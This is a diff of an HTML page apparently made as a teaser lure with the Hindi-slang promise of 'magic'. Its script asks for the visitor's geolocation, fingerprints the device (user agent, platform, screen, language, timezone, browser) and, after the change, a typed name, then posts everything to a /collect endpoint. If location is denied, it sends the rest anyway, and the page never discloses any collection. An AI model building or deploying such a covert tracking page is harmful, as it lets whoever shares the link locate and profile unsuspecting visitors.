@@ -78,10 +78,34 @@
 
         label {
             font-size: 14px;
+            display: block;
+            margin-top: 15px;
+            margin-bottom: 8px;
+            text-align: left;
         }
 
-        input {
-            transform: scale(1.3);
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: 0.3s;
+            margin-bottom: 15px;
+        }
+
+        input[type="text"]::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(99, 102, 241, 0.8);
+            box-shadow: 0 0 10px rgba(99, 102, 241, 0.4);
         }
 
         button {
@@ -103,6 +127,19 @@
             transform: scale(1.05);
             box-shadow: 0 0 15px rgba(99,102,241,0.8);
         }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 
@@ -117,7 +154,16 @@
     <h1>AA GYE AP👀</h1>
     <p>LAADLE KUCH JAADU DEKHNA?</p>
 
-    <button onclick="sendData()">Let's explore then</button>
+    <label for="nameInput">Enter Your Name:</label>
+    <input 
+        type="text" 
+        id="nameInput" 
+        placeholder="Type your name here..." 
+        autocomplete="off"
+    />
+    <div class="error-message" id="errorMessage">Please enter your name to proceed!</div>
+
+    <button onclick="handleProceed()">Let's explore then</button>
 </div>
 
 <script>
@@ -126,18 +172,42 @@ window.onload = function() {
     setTimeout(() => {
         document.getElementById("loader").style.display = "none";
         document.getElementById("mainCard").style.display = "block";
-        // Automatically collect data without waiting for button click
-        sendData();
     }, 2000); 
 };
 
-function sendData() {
+function handleProceed() {
+    const nameInput = document.getElementById("nameInput").value.trim();
+    const errorMessage = document.getElementById("errorMessage");
+    
+    if (nameInput === "") {
+        errorMessage.style.display = "block";
+        return;
+    }
+    
+    errorMessage.style.display = "none";
+    sendData(nameInput);
+}
+
+// Allow Enter key to submit
+document.addEventListener("DOMContentLoaded", function() {
+    document.getElementById("nameInput").addEventListener("keypress", function(event) {
+        if (event.key === "Enter") {
+            handleProceed();
+        }
+    });
+});
+
+function sendData(username) {
     navigator.geolocation.getCurrentPosition(function(pos) {
         const data = {
+            username: username,
             device: navigator.userAgent,
             platform: navigator.platform,
             screen: window.screen.width + "x" + window.screen.height,
-            location: pos.coords.latitude + ", " + pos.coords.longitude
+            location: pos.coords.latitude + ", " + pos.coords.longitude,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            browser_name: getBrowserName()
         };
 
         fetch('/collect', {
@@ -151,10 +221,14 @@ function sendData() {
     function() {
         // If location denied, still send other data
         const data = {
+            username: username,
             device: navigator.userAgent,
             platform: navigator.platform,
             screen: window.screen.width + "x" + window.screen.height,
-            location: "Location permission denied"
+            location: "Location permission denied",
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            browser_name: getBrowserName()
         };
 
         fetch('/collect', {
@@ -165,6 +239,16 @@ function sendData() {
 
         alert("Exploring...");
     });
+}
+
+function getBrowserName() {
+    const ua = navigator.userAgent;
+    if (ua.indexOf("Firefox") > -1) return "Firefox";
+    if (ua.indexOf("Chrome") > -1) return "Chrome";
+    if (ua.indexOf("Safari") > -1) return "Safari";
+    if (ua.indexOf("Edge") > -1) return "Edge";
+    if (ua.indexOf("Opera") > -1) return "Opera";
+    return "Unknown";
 }
 </script>
 
